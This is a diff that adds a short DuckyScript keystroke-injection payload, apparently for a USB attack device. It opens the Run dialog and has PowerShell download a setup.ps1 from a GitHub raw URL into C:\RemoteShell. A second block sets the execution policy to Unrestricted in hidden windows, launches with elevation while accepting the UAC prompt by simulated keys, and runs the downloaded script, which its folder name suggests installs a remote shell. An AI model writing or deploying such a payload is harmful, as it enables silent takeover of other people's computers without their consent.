@@ -1,0 +1,22 @@
+DELAY 300
+GUI r
+DELAY 300
+STRING powershell -Command "& {$url='https://raw.githubusercontent.com/fiveraptor/rs/main/setup.ps1';$ziel='C:\RemoteShell\setup.ps1';$w=New-Object Net.WebClient;if(!(Test-Path 'C:\RemoteShell')){md 'C:\RemoteShell'};$w.DownloadFile($url,$ziel)}"
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 500
+LEFTARROW
+DELAY 300
+ENTER
+
+DELAY 300
+GUI r
+DELAY 300
+STRING powershell -NoP -NonI -w h Set-ExecutionPolicy Unrestricted | powershell -NoP -NonI -w h -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; & 'C:\RemoteShell\setup.ps1'"
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 500
+LEFTARROW
+DELAY 300
+ENTER
+
